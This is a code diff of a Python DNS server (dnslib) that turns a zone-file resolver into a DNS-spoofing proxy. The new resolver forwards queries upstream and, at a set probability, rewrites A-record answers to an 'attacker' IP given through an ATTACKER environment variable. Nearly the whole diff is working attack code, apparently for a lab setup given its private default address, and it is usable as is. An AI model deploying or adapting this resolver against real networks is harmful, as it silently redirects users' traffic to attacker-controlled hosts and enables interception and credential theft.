@@ -9,27 +9,19 @@ from pathlib import Path
 from textwrap import wrap
 from time import sleep
 import random
-import time
 
 from dnslib import DNSLabel, QTYPE, RR, dns
 from dnslib.proxy import ProxyResolver
 from dnslib.server import DNSServer
 
-SERIAL_NO = int((datetime.utcnow() - datetime(1970, 1, 1)).total_seconds())
+# SERIAL_NO = int((datetime.utcnow() - datetime(1970, 1, 1)).total_seconds())
 logger = logging.getLogger()
-handler = logging.FileHandler(f'logfile_{datetime.now().strftime("%Y-%m-%d_%H:%M")}.log')
+handler = logging.FileHandler(f'logfile_{datetime.now().strftime("%m_%d-%H-%M")}.log')
 handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s', datefmt='%H:%M:%S'))
 
 logger.addHandler(handler)
-#logger.error('Our First Log Message')
-
-#handler = logging.StreamHandler()
-#handler.setLevel(logging.INFO)
-#handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s', datefmt='%H:%M:%S'))
-
-#logger = logging.getLogger(__name__)
-#logger.addHandler(handler)
 logger.setLevel(logging.INFO)
+
 
 TYPE_LOOKUP = {
     'A': (dns.A, QTYPE.A),
@@ -85,82 +77,20 @@ class Record:
 
 
 class Resolver(ProxyResolver):
-    def __init__(self, upstream, zone_file):
+    def __init__(self, upstream, attacker):
         super().__init__(upstream, 53, 5)
-        self.records = self.load_zones(zone_file)
-
-    def zone_lines(self):
-        current_line = ''
-        for line in zone_file.open():
-            if line.startswith('#'):
-                continue
-            line = line.rstrip('\r\n\t ')
-            if not line.startswith(' ') and current_line:
-                yield current_line
-                current_line = ''
-            current_line += line.lstrip('\r\n\t ')
-        if current_line:
-            yield current_line
-
-    def load_zones(self, zone_file):
-        assert zone_file.exists(), f'zone files "{zone_file}" does not exist'
-        logger.info('loading zone file "%s":', zone_file)
-        zones = []
-        for line in self.zone_lines():
-            try:
-                rname, rtype, args_ = line.split(maxsplit=2)
-                if args_.startswith('['):
-                    args = tuple(json.loads(args_))
-                else:
-                    args = (args_,)
-                record = Record(rname, rtype, args)
-                zones.append(record)
-                logger.info(' %2d: %s', len(zones), record)
-            except Exception as e:
-                raise RuntimeError(f'Error processing line ({e.__class__.__name__}: {e}) "{line.strip()}"') from e
-        logger.info('%d zone resource records generated from zone file', len(zones))
-        return zones
+        self.attacker = attacker
 
     def resolve(self, request, handler):
-#        with open("aaa.txt", 'w') as f:
-#            f.write(f"{time.time()}")
-#        logger.info("click")
-        type_name = QTYPE[request.q.qtype]
-        reply = request.reply()
-        for record in self.records:
-            if record.match(request.q):
-                reply.add_answer(record.rr)
-
-        if reply.rr:
-            logger.info('found zone for %s[%s], %d replies', request.q.qname, type_name, len(reply.rr))
-            return reply
-        else:
-            if close_traffic and random.random() < attack_probability:
-                arg = (self._get_some_arg(),)
-                new_record = Record(rname=request.q.qname, rtype='A', args=arg)
-                self.records.append(new_record)
-                reply.add_answer(new_record.rr)
-                logger.info("\033[33m no record for %s, mapped it to %s \033[0m", request.q.qname, arg)
-                return reply
-        # no direct zone so look for an SOA record for a higher level zone
-        for record in self.records:
-            if record.sub_match(request.q):
-                reply.add_answer(record.rr)
-
-        if reply.rr:
-            logger.info('found higher level SOA resource for %s[%s]', request.q.qname, type_name)
-            return reply
-
-        logger.info('no local zone found, proxying %s[%s]', request.q.qname, type_name)
-        return super().resolve(request, handler)
-
-    def _get_some_arg(self):
-        # random_record = random.sample(self.records, 1)[0].rr.rdata.data
-        # record_ip = (str(i) for i in random_record)
-        # ip = ".".join(record_ip)
-        ip = '10.0.28.196'#'54.68.132.136'
-        logger.info("ADDED %s", ip)
-        return ip
+        reply = super().resolve(request, handler)
+        for i in range(len(reply.rr)):
+            if reply.rr[i].rtype not in TYPE_LOOKUP['A']:
+                continue
+            if random.random() < attack_probability:
+                reply.rr[i].rdata = dns.A(self.attacker)
+        print(reply)
+        logger.info(reply)
+        return reply
 
 
 def handle_sig(signum, frame):
@@ -170,13 +100,16 @@ def handle_sig(signum, frame):
 
 if __name__ == '__main__':
     # for the signal SIGTERM - call the handle_sig function
+    logger.info("start DNS file")
     signal.signal(signal.SIGTERM, handle_sig)
+
     port = int(os.getenv('PORT', 53))
     close_traffic = bool(int(os.getenv('CLOSE', 1)))
-    attack_probability = float(os.getenv('P', 0.4))
+    attack_probability = float(os.getenv('P', 0.2))
     upstream = os.getenv('UPSTREAM', '8.8.8.8')
-    zone_file = Path(os.getenv('ZONE_FILE', 'zones.txt'))
-    resolver = Resolver(upstream, zone_file)
+    attacker_ip = os.getenv('ATTACKER', '10.0.28.196')
+    zone_file = Path(os.getenv('ZONE_FILE', 'zones2.txt'))
+    resolver = Resolver(upstream, attacker_ip)
     udp_server = DNSServer(resolver, port=port)
     tcp_server = DNSServer(resolver, port=port, tcp=True)
 
@@ -187,12 +120,10 @@ if __name__ == '__main__':
         logger.info('traffic is open, upstream DNS server "%s', upstream)
     udp_server.start_thread()
     tcp_server.start_thread()
-#    with open("a.txt", 'w') as f:
-#        f.write('1')
+
     try:
         while udp_server.isAlive():
-#            with open("aa.txt", 'w') as f:
-#                f.write('1')
             sleep(1)
     except KeyboardInterrupt:
         pass
+
